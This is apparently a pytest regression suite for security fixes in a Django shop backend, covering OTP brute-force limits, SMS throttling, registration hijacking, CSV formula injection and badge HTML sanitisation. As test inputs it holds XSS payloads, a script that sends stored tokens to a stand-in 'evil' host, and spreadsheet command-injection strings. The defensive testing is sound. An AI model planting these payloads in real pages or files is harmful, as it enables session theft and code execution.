"""Tests for security fixes: each one fails on the code as it was before the fix."""
import pytest
from django.contrib.auth import get_user_model
from django.urls import reverse
from rest_framework.test import APIClient

User = get_user_model()


@pytest.fixture
def paid_order(db):
    from orders.models import Order

    owner = User.objects.create_user(phone="09125550001", password="securepass123")
    return Order.objects.create(
        user=owner, order_number="ORD-PAID0001", shipping_address="Valiasr St, no. 12", shipping_city="Tehran",
        shipping_zip="1234567890", shipping_phone="09125550001", subtotal=100, total=100,
        payment_status=Order.PAYMENT_STATUS_PAID, status=Order.STATUS_CONFIRMED,
        payment_gateway="zarinpal", payment_authority="A0000000000000000000000000000012345", payment_ref_id="777",
    )


@pytest.mark.django_db
class TestPaymentVerifyPrivacy:
    """The verify endpoint is public: an order number alone must not reveal the order."""

    url = reverse("orders:order-pay-verify")

    def test_paid_order_is_not_shown_without_its_authority(self, paid_order):
        for authority in ("guess", "ZP-MOCK-x"):
            res = APIClient().post(self.url, {"order_number": paid_order.order_number, "authority": authority})
            assert res.status_code == 400
            assert "order" not in res.data
            assert "Valiasr" not in str(res.data)

    def test_paid_order_is_shown_again_with_its_authority(self, paid_order):
        res = APIClient().post(
            self.url, {"order_number": paid_order.order_number, "authority": paid_order.payment_authority}
        )
        assert res.status_code == 200
        assert res.data["order"]["order_number"] == paid_order.order_number
        assert res.data["ref_id"] == "777"

    def test_unknown_order_looks_like_a_wrong_authority(self, paid_order):
        unknown = APIClient().post(self.url, {"order_number": "ORD-NOPE0000", "authority": "guess"})
        wrong = APIClient().post(self.url, {"order_number": paid_order.order_number, "authority": "guess"})
        assert (unknown.status_code, unknown.data) == (wrong.status_code, wrong.data)


class TestCsvFormulaInjection:
    def test_formula_cells_are_written_as_text(self):
        from hooperzone.csv_export import csv_response

        rows = [["=HYPERLINK(\"http://evil\")", "+989120000000", "-1+1", "@SUM(A1)", "Ali", 1500, -3]]
        lines = csv_response("x", ["a"], rows).content.decode("utf-8").splitlines()
        assert lines[1] == "\"'=HYPERLINK(\"\"http://evil\"\")\",'+989120000000,'-1+1,'@SUM(A1),Ali,1500,-3"

    @pytest.mark.django_db
    def test_order_export_neutralises_a_customer_address(self, paid_order):
        paid_order.shipping_address = "=cmd|' /C calc'!A0"
        paid_order.save()
        staff = User.objects.create_superuser(phone="09125550002", password="securepass123")
        client = APIClient()
        client.force_authenticate(staff)
        body = client.get(reverse("orders:admin-order-export")).content.decode("utf-8")
        assert "'=cmd|" in body and ",=cmd|" not in body


@pytest.mark.django_db
class TestOtpGuessLimit:
    """A code dies after a few wrong guesses, whatever IP they come from."""

    def _code(self, user, otp_type):
        from accounts.models import OTPCode

        return OTPCode.objects.create(user=user, otp_type=otp_type)

    def _wrong(self, code):
        return "000000" if code != "000000" else "111111"

    def test_login_code_is_cancelled_after_five_wrong_guesses(self):
        from accounts.models import OTPCode

        user = User.objects.create_user(phone="09125550003", password="securepass123")
        otp = self._code(user, "login")
        url = reverse("accounts:otp-verify")
        payload = {"phone": user.phone, "otp_type": "login"}
        for _ in range(OTPCode.MAX_FAILED_ATTEMPTS):
            assert APIClient().post(url, {**payload, "code": self._wrong(otp.code)}).status_code == 400
        # The right code no longer works: the attacker's sixth try can't be the lucky one.
        res = APIClient().post(url, {**payload, "code": otp.code})
        assert res.status_code == 400 and "tokens" not in res.data
        otp.refresh_from_db()
        assert otp.is_used and otp.failed_attempts == OTPCode.MAX_FAILED_ATTEMPTS

    def test_a_few_typos_do_not_cancel_the_code(self):
        user = User.objects.create_user(phone="09125550004", password="securepass123")
        otp = self._code(user, "login")
        url = reverse("accounts:otp-verify")
        payload = {"phone": user.phone, "otp_type": "login"}
        for _ in range(2):
            assert APIClient().post(url, {**payload, "code": self._wrong(otp.code)}).status_code == 400
        assert "tokens" in APIClient().post(url, {**payload, "code": otp.code}).data

    def test_password_reset_code_has_the_same_limit(self):
        from accounts.models import OTPCode

        user = User.objects.create_user(phone="09125550005", password="securepass123")
        otp = self._code(user, "reset_password")
        url = reverse("accounts:password-reset")
        payload = {"phone": user.phone, "new_password": "attackerpass1"}
        for _ in range(OTPCode.MAX_FAILED_ATTEMPTS):
            assert APIClient().post(url, {**payload, "code": self._wrong(otp.code)}).status_code == 400
        assert APIClient().post(url, {**payload, "code": otp.code}).status_code == 400
        user.refresh_from_db()
        assert user.check_password("securepass123")

    def test_wrong_guess_of_another_type_does_not_count(self):
        user = User.objects.create_user(phone="09125550006", password="securepass123")
        otp = self._code(user, "login")
        res = APIClient().post(
            reverse("accounts:otp-verify"), {"phone": user.phone, "otp_type": "reset_password", "code": "000000"}
        )
        assert res.status_code == 400
        otp.refresh_from_db()
        assert otp.failed_attempts == 0


@pytest.mark.django_db
class TestOtpSmsFlood:
    def test_one_phone_gets_a_limited_number_of_codes(self, monkeypatch):
        from rest_framework.throttling import SimpleRateThrottle

        monkeypatch.setattr(SimpleRateThrottle, "THROTTLE_RATES", {"otp": "1000/min", "otp_phone": "3/hour"})
        url = reverse("accounts:otp-send")
        # Persian digits are the same phone; each request comes from another address.
        phones = ["09125550007", "۰۹۱۲۵۵۵۰۰۰۷", "09125550007", "09125550007"]
        codes = [
            APIClient(REMOTE_ADDR=f"10.0.0.{i}").post(url, {"phone": phone, "otp_type": "register"}).status_code
            for i, phone in enumerate(phones)
        ]
        assert codes == [200, 200, 200, 429]
        # Another customer is not affected.
        assert APIClient().post(url, {"phone": "09125550008", "otp_type": "register"}).status_code == 200


@pytest.mark.django_db
class TestRegistrationNeedsTheCode:
    """Finishing an OTP registration sets a password, so it needs proof of the code, not just the phone."""

    def _verify(self, phone):
        from accounts.models import OTPCode

        APIClient().post(reverse("accounts:otp-send"), {"phone": phone, "otp_type": "register"})
        otp = OTPCode.objects.filter(user__phone=phone, otp_type="register").latest("created_at")
        return APIClient().post(
            reverse("accounts:otp-verify"), {"phone": phone, "code": otp.code, "otp_type": "register"}
        )

    def test_stranger_cannot_finish_someone_elses_verified_registration(self):
        phone = "09125550010"
        assert self._verify(phone).status_code == 200  # the owner entered their code, then paused
        for extra in ({}, {"registration_token": "made-up"}):
            res = APIClient().post(
                reverse("accounts:register"), {"phone": phone, "password": "attackerpass1", **extra}
            )
            assert res.status_code == 400 and "tokens" not in res.data
        assert not User.objects.get(phone=phone).has_usable_password()

    def test_token_of_one_phone_does_not_open_another(self):
        mine = self._verify("09125550011").data["registration_token"]
        assert self._verify("09125550012").status_code == 200
        res = APIClient().post(
            reverse("accounts:register"),
            {"phone": "09125550012", "password": "attackerpass1", "registration_token": mine},
        )
        assert res.status_code == 400
        assert not User.objects.get(phone="09125550012").has_usable_password()

    def test_expired_token_is_refused(self, monkeypatch):
        from accounts import views

        token = self._verify("09125550013").data["registration_token"]
        monkeypatch.setattr(views, "REGISTRATION_TOKEN_MAX_AGE", -1)
        res = APIClient().post(
            reverse("accounts:register"),
            {"phone": "09125550013", "password": "securepass123", "registration_token": token},
        )
        assert res.status_code == 400

    def test_username_that_is_someone_elses_pending_phone_is_refused(self):
        """Used to crash with a database error (two users would share the value)."""
        assert self._verify("09125550014").status_code == 200
        res = APIClient().post(
            reverse("accounts:register"),
            {"username": "09125550014", "phone": "09125550015", "password": "securepass123"},
        )
        assert res.status_code == 400
        assert not User.objects.filter(phone="09125550015").exists()


@pytest.mark.django_db
class TestLoginIdentifiers:
    """People sign in with phone, username or email; one account must not shadow another."""

    def _profile(self, user, data):
        client = APIClient()
        client.force_authenticate(user)
        return client.patch(reverse("accounts:profile"), data, format="json")

    def test_username_cannot_be_someone_elses_phone(self):
        squatter = User.objects.create_user(phone="09125550020", password="securepass123")
        User.objects.create_user(phone="09125550021", password="securepass123")
        assert self._profile(squatter, {"username": "09125550021"}).status_code == 400
        # ...nor a number that is still free, with Persian digits or not: its owner must be able to register.
        assert self._profile(squatter, {"username": "nickname"}).status_code == 200

    def test_phone_cannot_be_someone_elses_username(self):
        user = User.objects.create_user(phone="09125550022", password="securepass123")
        User.objects.create_user(phone="09125550023", username="09125550024", password="securepass123")
        assert self._profile(user, {"phone": "۰۹۱۲۵۵۵۰۰۲۴"}).status_code == 400

    def test_changing_phone_clears_verified(self):
        user = User.objects.create_user(phone="09125550025", password="securepass123", is_verified=True)
        assert self._profile(user, {"first_name": "Sara"}).status_code == 200
        user.refresh_from_db()
        assert user.is_verified
        assert self._profile(user, {"phone": "09125550026"}).status_code == 200
        user.refresh_from_db()
        assert user.phone == "09125550026" and not user.is_verified

    def test_lookalike_account_does_not_lock_the_owner_out(self):
        """An older account whose email/username equals the owner's login name came first before."""
        older = User.objects.create_user(phone="09125550027", password="otherpass123", email="sara@example.com")
        owner = User.objects.create_user(phone="09125550028", username="sara@example.com", password="securepass123")
        login = reverse("accounts:login")
        res = APIClient().post(login, {"username": "sara@example.com", "password": "securepass123"})
        assert res.status_code == 200 and res.data["user"]["id"] == owner.id
        res = APIClient().post(login, {"username": "sara@example.com", "password": "otherpass123"})
        assert res.status_code == 200 and res.data["user"]["id"] == older.id
        assert APIClient().post(login, {"username": "sara@example.com", "password": "wrongpass123"}).status_code == 400


ENAMAD = (
    "<a referrerpolicy='origin' target='_blank' href='https://trustseal.enamad.ir/?id=123&Code=AbC'>"
    "<img referrerpolicy='origin' src='https://trustseal.enamad.ir/logo.aspx?id=123&Code=AbC' alt='' "
    "style='cursor:pointer' code='AbC'></a>"
)
SAMANDEHI = (
    "<img referrerpolicy='origin' id='rgvjfukz' style='cursor:pointer' "
    "onclick='window.open(\"https://logo.samandehi.ir/Verify.aspx?id=9&p=xl\", \"Popup\",\"toolbar=no\")' "
    "alt='logo-samandehi' src='https://logo.samandehi.ir/logo.aspx?id=9&p=nb'/>"
)


class TestBadgeHtml:
    def test_enamad_badge_keeps_its_link_picture_and_code(self):
        from orders.badge_html import clean_badge_html

        assert clean_badge_html(ENAMAD) == (
            '<a referrerpolicy="origin" target="_blank" href="https://trustseal.enamad.ir/?id=123&amp;Code=AbC" '
            'rel="noopener"><img referrerpolicy="origin" '
            'src="https://trustseal.enamad.ir/logo.aspx?id=123&amp;Code=AbC" alt="" code="AbC"></a>'
        )

    def test_samandehi_onclick_becomes_a_plain_link(self):
        from orders.badge_html import clean_badge_html

        cleaned = clean_badge_html(SAMANDEHI)
        assert cleaned.startswith('<a href="https://logo.samandehi.ir/Verify.aspx?id=9&amp;p=xl" target="_blank"')
        assert 'src="https://logo.samandehi.ir/logo.aspx?id=9&amp;p=nb"' in cleaned and cleaned.endswith("</a>")
        assert "onclick" not in cleaned and "window.open" not in cleaned

    @pytest.mark.parametrize("payload, cleaned", [
        ("<script>fetch('https://evil/'+localStorage.tokens)</script>", ""),
        ("<img src=x onerror=alert(1)>", ""),
        ("<img src='https://ok/a.png' onerror='alert(1)' onload=alert(2)>", '<img src="https://ok/a.png">'),
        ("<a href='javascript:alert(1)'>x</a>", '<a rel="noopener"></a>'),
        ("<a href=' JaVaScRiPt:alert(1)'><img src='data:image/svg+xml,<svg onload=alert(1)>'></a>",
         '<a rel="noopener"></a>'),
        ("<svg onload=alert(1)><iframe src='https://evil'></iframe><style>*{display:none}</style>", ""),
        ("<a href='https://ok/' style='position:fixed;inset:0'>click</a><form action='https://evil'><input></form>",
         '<a href="https://ok/" rel="noopener"></a>'),
        # Quotes inside a value can't close the attribute and start a new tag.
        ("<img src=\"https://ok/a.png\" alt='\"><script>alert(1)</script>'>",
         '<img src="https://ok/a.png" alt="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">'),
        ("<a href='https://ok/\"onmouseover=alert(1) x=\"'>", '<a rel="noopener"></a>'),
    ])
    def test_nothing_that_runs_survives(self, payload, cleaned):
        from orders.badge_html import clean_badge_html

        assert clean_badge_html(payload) == cleaned

    @pytest.mark.django_db
    def test_settings_are_cleaned_on_save_and_on_the_way_out(self):
        from orders.models import ShopSettings

        staff = User.objects.create_superuser(phone="09125550030", password="securepass123")
        client = APIClient()
        client.force_authenticate(staff)
        res = client.patch(
            reverse("orders:admin-settings"),
            {"enamad_html": ENAMAD + "<script>alert(1)</script>", "samandehi_html": "<img src=x onerror=alert(1)>"},
            format="json",
        )
        assert res.status_code == 200
        shop = ShopSettings.load()
        assert "<script" not in shop.enamad_html and "trustseal.enamad.ir" in shop.enamad_html
        assert shop.samandehi_html == ""
        # A row written before the cleaning existed is still safe for visitors.
        ShopSettings.objects.filter(pk=1).update(samandehi_html="<img src=x onerror=alert(1)>")
        assert APIClient().get(reverse("orders:shop-info")).data["samandehi_html"] == ""
